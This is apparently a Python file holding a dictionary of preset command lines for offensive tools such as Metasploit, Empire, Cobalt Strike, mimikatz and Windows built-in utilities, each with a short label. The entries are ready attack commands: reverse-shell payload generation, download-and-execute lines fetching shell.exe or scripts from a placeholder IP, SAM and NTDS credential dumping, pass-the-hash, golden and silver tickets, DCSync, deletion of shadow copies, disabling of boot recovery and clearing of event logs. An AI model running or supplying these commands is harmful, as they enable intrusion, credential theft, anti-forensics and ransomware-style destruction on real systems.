BUILTIN_ARGS = {
    "metasploit": [
        ("msfconsole -q", "Quiet start"),
        ("msfconsole -x 'db_nmap -sV target.com'", "Nmap from MSF"),
        ("msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe", "Win reverse"),
        ("msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o payload.apk", "Android"),
        ("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf", "Linux"),
        ("msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php", "PHP"),
        ("msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o shell.py", "Python"),
        ("msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=4444 -f raw", "Bash reverse"),
        ("msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f macho -o shell.macho", "MacOS"),
        ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f psh-cmd", "PS cmd"),
    ],
    "empire": [
        ("usestager windows/launcher_bat", "Windows stager"),
        ("usestager multi/bash", "Bash stager"),
        ("usestager osx/launcher", "MacOS stager"),
        ("agents", "List agents"),
    ],
    "cobalt_strike": [
        ("teamserver IP password", "Start teamserver"),
        ("agscript IP port user pass script.cna", "Run script"),
    ],
    "setoolkit": [
        ("-s", "Social engineering"), ("-p", "Phishing vectors"),
        ("-w", "Website vectors"), ("-q", "Quick track"),
        ("-m", "Mass mailer"), ("-c", "Credential harvester"),
    ],
    "powershell": [
        ("-c 'Invoke-WebRequest http://IP/shell.exe -OutFile shell.exe'", "Download file"),
        ("-c 'IEX(New-Object Net.WebClient).DownloadString(http://IP/script.ps1)'", "Download execute"),
        ("-enc BASE64_COMMAND", "Encoded command"),
        ("-NoP -NonI -W Hidden -Exec Bypass -c '...'", "Hidden bypass"),
    ],
    "certutil": [
        ("-urlcache -f http://IP/shell.exe shell.exe", "Download file"),
        ("-encode file.txt file.b64", "Base64 encode"),
    ],
    "bitsadmin": [
        ("/transfer job /download /priority high http://IP/shell.exe %temp%\\shell.exe", "Download"),
    ],
    "wmic": [
        ("process call create 'cmd /c whoami'", "Execute command"),
        ("/node:IP /user:admin /password:pass process call create 'cmd'", "Remote exec"),
    ],
    "schtasks": [
        ("/create /tn TaskName /tr 'cmd.exe' /sc ONLOGON", "Create task"),
        ("/create /s IP /u user /p pass /tn TaskName /tr 'cmd'", "Remote task"),
    ],
    "reg": [
        ("save HKLM\\SAM sam.save", "Save SAM"),
        ("save HKLM\\SYSTEM sys.save", "Save SYSTEM"),
        ("query HKLM\\Software", "Query registry"),
    ],
    "netsh": [
        ("advfirewall firewall add rule name='Allow' dir=in action=allow protocol=TCP localport=4444", "Add rule"),
        ("interface portproxy add v4tov4 listenport=4444 connectaddress=IP connectport=80", "Port forward"),
    ],
    "vssadmin": [
        ("list shadows", "List shadow copies"),
        ("delete shadows /all /quiet", "Delete shadows"),
    ],
    "bcdedit": [
        ("/set {default} bootstatuspolicy ignoreallfailures", "Ignore failures"),
        ("/set {default} recoveryenabled No", "Disable recovery"),
    ],
    "wevtutil": [
        ("cl System", "Clear system log"),
        ("cl Security", "Clear security log"),
        ("cl Application", "Clear app log"),
    ],
    "auditpol": [
        ("/clear /y", "Clear audit policy"),
    ],
    "icacls": [
        ("file /grant Everyone:F", "Grant all access"),
        ("C:\\Windows\\System32\\*.exe /grant Everyone:F", "Mass grant"),
    ],
    "takeown": [
        ("/f file.txt", "Take ownership"),
        ("/f C:\\Windows\\System32 /r", "Recursive take"),
    ],
    "cipher": [
        ("/w:C:\\", "Wipe free space"),
    ],
    "esentutl": [
        ("/p %windir%\\ntds\\ntds.dit", "Repair NTDS"),
    ],
    "ntdsutil": [
        ("create full %temp%\\ntds", "Create NTDS snapshot"),
    ],
    "dnscmd": [
        ("/zoneadd target.com /primary", "Add zone"),
        ("/recordadd target.com @ A IP", "Add record"),
    ],
    "csvde": [
        ("-f output.csv -r '(objectClass=user)'", "Export users"),
    ],
    "ldifde": [
        ("-f output.ldf -r '(objectClass=user)'", "Export LDIF"),
    ],
    "rpcclient": [
        ("-U '' target -c 'srvinfo'", "Null session"),
        ("-U user%pass target -c 'enumdomusers'", "Enum users"),
    ],
    "smbclient": [
        ("-L //target -N", "Null list shares"),
        ("//target/share -U user%pass", "Connect share"),
    ],
    "enum4linux": [
        ("-a target", "Full enum"),
        ("-U target", "User enum"),
        ("-S target", "Share enum"),
    ],
    "nbtscan": [
        ("192.168.1.0/24", "NetBIOS scan"),
    ],
    "onesixtyone": [
        ("-c community.txt target", "SNMP brute"),
    ],
    "snmpwalk": [
        ("-v2c -c public target", "Walk MIB"),
        ("-v2c -c public target 1.3.6.1.2.1.1", "System info"),
    ],
    "ike-scan": [
        ("target", "IKE scan"),
        ("-M target", "Aggressive mode"),
    ],
    "pth-toolkit": [
        ("pth-winexe -U user%hash //target cmd", "Pass-the-hash"),
        ("pth-rpcclient -U user%hash //target", "RPC PTH"),
    ],
    "golden_ticket": [
        ("mimikatz # kerberos::golden /domain:DOMAIN /sid:SID /rc4:HASH /user:USER", "Golden ticket"),
    ],
    "silver_ticket": [
        ("mimikatz # kerberos::golden /domain:DOMAIN /sid:SID /target:SERVER /rc4:HASH /user:USER", "Silver ticket"),
    ],
    "dcsync": [
        ("mimikatz # lsadump::dcsync /domain:DOMAIN /user:USER", "DCSync attack"),
    ],
    "skeleton_key": [
        ("mimikatz # misc::skeleton", "Skeleton key install"),
    ],
    "overpass_hash": [
        ("mimikatz # sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH", "Overpass hash"),
    ],
    "kerberoast": [
        ("GetUserSPNs.py domain/user:pass -request -outputfile hashes.txt", "Kerberoast"),
    ],
    "asreproast": [
        ("GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt", "ASREPRoast"),
    ],
}
